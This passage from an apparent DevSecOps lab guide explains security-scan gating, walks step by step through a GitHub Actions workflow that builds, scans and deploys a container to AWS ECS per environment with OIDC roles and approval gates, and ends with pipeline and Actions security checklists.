| Scan type | What it inspects | Earliest place it can run | Gate policy |
| --- | --- | --- | --- |
| **Secret scan** | Source for committed credentials | Pre-commit + PR | **Block** any verified secret |
| **SAST** | First-party source code | PR (needs source only) | **Block** high/critical |
| **SCA** | Declared dependencies / lockfiles | PR (needs manifest) | **Block** critical CVEs, warn lower |
| **IaC scan** | Terraform/K8s/Dockerfile config | PR | **Block** policy violations |
| **Container scan** | Built image layers | After build | **Block** fixable critical |
| **DAST / smoke** | Running app | After deploy to qa/staging | Warn/manual; block obvious failures |
| **SBOM + signing** | Provenance of the artifact | After build | Block if signing fails |

**Gating policy principles:**
- **Block** on issues that are *actionable and high-confidence* (verified secrets, critical
  CVEs with a fix, IaC policy violations).
- **Warn** (report + continue, e.g., `continue-on-error: true`) on *noisy/low-severity/
  unfixable* findings so you don't train people to ignore red builds.
- Always **publish results** (SARIF → Security tab, summaries, PR comments) even when warning.
- Make the policy **explicit and version-controlled** (severity thresholds in the workflow),
  not a per-reviewer judgment call.

> In this lab: **SonarQube** (SAST) runs on every PR and push and *can* fail the build;
> **Snyk** container scan runs with `continue-on-error: true` (it **warns** - reports vulns
> without blocking). That's a deliberate teaching default; tighten Snyk to block on
> critical for real use.

---

## 7. Worked example: walking through THIS repo's `ci-cd.yml`

File: [`repo-seed/.github/workflows/ci-cd.yml`](../repo-seed/.github/workflows/ci-cd.yml).
Two jobs: **`build-and-scan`** (always; the required status check) and **`deploy`**
(push-only, environment-gated).

### 7.1 Triggers & top-level permissions

```yaml
on:
  push:
    branches: [dev, qa, main]   # main = production
  pull_request:
    branches: [main, dev, qa]

permissions:
  contents: read
  id-token: write               # required for AWS OIDC
```

- Runs on **push** to the three environment branches and on **PRs** targeting them.
- Top-level permissions are minimal: read code + mint OIDC tokens.

### 7.2 Job `build-and-scan` - runs on **both** PRs and pushes

```yaml
permissions:
  contents: write   # needed to push the git tag on main
  id-token: write
env:
  SONAR_TOKEN:    ${{ secrets.SONAR_TOKEN }}
  SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
  SNYK_TOKEN:     ${{ secrets.SNYK_TOKEN }}
outputs:
  image:   ${{ steps.push.outputs.image }}
  version: ${{ steps.version.outputs.version }}
```

- It elevates `contents: write` (only here) to push a git tag on prod.
- Secrets are surfaced into `env` so steps can do `if: env.SONAR_TOKEN != ''`
  (gracefully skip scanners when the token isn't configured - see §2.5).
- It exposes two **job outputs** (`image`, `version`) for the `deploy` job.

**Steps that always run (PRs too - no AWS):**

1. `actions/checkout@v4` with `fetch-depth: 0` - full history **and tags**, required for the
   semver bump on `main`.
2. **Build image (validation):** `docker build -t app:ci .` - proves the image builds even on
   PRs (no registry needed).
3. **SonarQube scan** - runs only if `SONAR_TOKEN` is set (SAST; **can block**).
4. **Snyk container scan** - `continue-on-error: true` → **warns, never blocks** (§6).

**Steps gated by `if: github.event_name == 'push'` (skipped on PRs):**

5. **Map branch → env / role / ECR** (`id: cfg`): a `case` on `github.ref_name` writes
   `env`, `role`, and `ecr` to `$GITHUB_OUTPUT`. `dev→dev`, `qa→qa`, `main→prod`; unknown
   branch → `exit 1`.
6. **Determine version** (`id: version`): on `main`, fetch tags, find latest `vX.Y.Z`, bump
   **patch** → e.g. `v0.0.3`; on dev/qa, use the 12-char commit SHA (`${GITHUB_SHA::12}`).
7. **Create & push git tag** - `main` only; tags the repo with the new semver as
   `github-actions[bot]` (this is why the job needed `contents: write`).
8. **Configure AWS credentials (OIDC):** assumes the **env-scoped role** from step `cfg`
   (`vars.ROLE_ARN_DEV/QA/PROD`) - no static keys.
9. **Login to ECR** (`id: ecr`).
10. **Tag & push image** (`id: push`): tags `app:ci` as
    `$REGISTRY/$REPOSITORY:$TAG` and pushes it to **that environment's ECR**, then exports
    `image=` as a step/job output.

> **Key security property:** on a **pull request**, every AWS-touching step is skipped.
> A PR can only **build and scan** - it never gets cloud credentials, never pushes an image,
> never deploys. This is the safe-by-default posture from §5.1.

### 7.3 Job `deploy` - push-only, environment-gated

```yaml
deploy:
  needs: build-and-scan
  if: github.event_name == 'push'
  runs-on: ubuntu-latest
  environment: ${{ github.ref_name == 'main' && 'prod' || github.ref_name }}
  permissions:
    contents: read
    id-token: write
```

- `needs: build-and-scan` - waits for the build and **inherits its outputs**
  (`needs.build-and-scan.outputs.image`).
- `if: github.event_name == 'push'` - never deploys from a PR (job-level `if:` reading a
  `github.*` value, which is allowed - §2.5).
- `environment:` selects the matching **GitHub Environment** where the approval gate / wait
  timer lives: `main → prod`, otherwise `dev`/`qa`. **This is the human gate**: the prod env
  has required reviewers (provisioned in `github.tf` / `iam.tf`), so the deploy **pauses**
  until approved, and prod's environment secrets/vars resolve only *after* approval.
- Permissions drop back to `contents: read` + `id-token: write` (least privilege).

**Deploy steps:**

1. `actions/checkout@v4`.
2. **Configure AWS credentials (OIDC):** assumes `vars.AWS_ROLE_ARN` - the **environment-scoped**
   role (resolved from the GitHub Environment, so it's the right role for dev/qa/prod).
3. **Fetch current task definition:** `aws ecs describe-task-definition`, stripping
   server-managed fields with `jq` into `task-def.json`.
4. **Render task definition with new image** (`amazon-ecs-render-task-definition`): injects
   `needs.build-and-scan.outputs.image` into the named container.
5. **Deploy to ECS** (`amazon-ecs-deploy-task-definition`) with
   `wait-for-service-stability: true` - registers the new revision, updates the service, and
   **waits until ECS reports the service stable** (so a failed rollout fails the job).

### 7.4 How the pieces map to AWS IAM (build-once + least privilege)

From `iam.tf`, each environment has its **own** deploy role whose trust policy only allows the
`sub` claims `repo:OWNER/REPO:environment:<env>` or
`repo:OWNER/REPO:ref:refs/heads/<branch>`. Each role's permission policy can push/pull **only
that env's ECR repo** and roll **only that env's ECS service**, plus `iam:PassRole` for the
shared task-execution role. Net effect:

- The **dev** pipeline physically **cannot** assume the **prod** role.
- The image built once in `build-and-scan` is pushed to the env's ECR and the **same image
  reference** is what `deploy` renders into the task definition - **build-once-deploy** in
  practice.

### 7.5 End-to-end flow

```
PR to dev/qa/main ──▶ build-and-scan ONLY (docker build + Sonar + Snyk; no AWS)
                       └─ required status check must be green to merge (branch protection)

push to dev ──▶ build-and-scan ──▶ push image:<sha> to dev ECR
            └─▶ deploy (env=dev)  ──▶ ECS rolling update (auto if no reviewer)

push to qa  ──▶ build-and-scan ──▶ push image:<sha> to qa ECR
            └─▶ deploy (env=qa)   ──▶ [optional approval] ──▶ ECS update

push to main ▶ build-and-scan ──▶ bump vX.Y.Z + push git tag ──▶ push image:vX.Y.Z to prod ECR
            └▶ deploy (env=prod) ──▶ [REQUIRED reviewer + wait timer] ──▶ ECS update + wait stable
```

---

## 8. Checklists

### 8.1 Pipeline design checklist

- [ ] **Build the artifact once**, promote the same immutable tag/digest through all envs.
- [ ] Cheap checks first (lint, unit), expensive last (e2e, deploy).
- [ ] Independent jobs run in **parallel**; ordering enforced only via `needs`.
- [ ] Every stage is **deterministic** (pinned tool & action versions, lockfiles).
- [ ] Re-running any stage is **idempotent / safe**.
- [ ] PRs build + test + scan but **never** touch prod credentials or deploy.
- [ ] Clear **gates**: automated quality/security gates + a **human approval before prod**.
- [ ] **Concurrency** control (queue deploys, cancel stale CI).
- [ ] Job outputs / artifacts pass the right data downstream.
- [ ] **Observability**: status checks, SARIF in Security tab, run summaries, notifications.
- [ ] A documented, one-step **rollback** (redeploy previous immutable revision/tag; on K8s, `git revert` the manifest).
- [ ] `timeout-minutes` set to bound hung jobs.
- [ ] Branch protection requires the CI status check before merge.
- [ ] **Supply chain:** SBOM generated, image **signed** (cosign), and **SLSA provenance** attested for the shipped digest.
- [ ] Promotion to prod is a **reviewed change** (PR/tag), not a rebuild; **separation of duties** enforced (no self-approval of own prod release).
- [ ] **Policy-as-code** gates (OPA/Conftest, Kyverno/Gatekeeper) block non-compliant config in CI/admission.
- [ ] Kubernetes deploys use **GitOps** (Argo CD / Flux), not `kubectl`/`helm` from CI.

### 8.2 GitHub Actions security checklist

- [ ] `permissions:` defaults to `contents: read`; elevated **per job** only where needed.
- [ ] **OIDC** for cloud auth (`id-token: write`); **no** long-lived cloud keys as secrets.
- [ ] Cloud trust policy scoped to **repo + branch/environment** `sub` claims.
- [ ] **No** `pull_request_target` that checks out / executes PR-head code.
- [ ] Untrusted `${{ github.event.* }}` values passed via **env vars**, never inlined in `run:`.
- [ ] All **third-party actions pinned to full commit SHAs** (avoid `@master`/floating tags).
- [ ] **Forked PRs** receive no secrets and no cloud access (use `pull_request`, not `_target`).
- [ ] Secrets are **environment secrets** that resolve only **after approval** for prod.
- [ ] Secrets **never echoed**; not passed as CLI args; `set -x` avoided around secrets.
- [ ] **Concurrency**: deploys queue (no `cancel-in-progress` mid-deploy).
- [ ] Cache keys are lockfile-hash based; restored caches treated as untrusted.
- [ ] Self-hosted runners are **ephemeral & isolated** - or avoided on public repos.
- [ ] **Required reviewers + wait timer** on the prod environment; branch protection on `main`.
- [ ] Dependabot enabled for GitHub Actions to keep pinned SHAs current.
- [ ] Scan results published as **SARIF**; explicit, version-controlled **block-vs-warn** policy.
- [ ] Deploy step **verifies** the image's cosign signature and SLSA provenance before release.

---

*End of guide. See also the live pipeline at
[`repo-seed/.github/workflows/ci-cd.yml`](../repo-seed/.github/workflows/ci-cd.yml),
`github.tf` (repo/env/protection provisioning), and `iam.tf` (per-env OIDC deploy roles).*
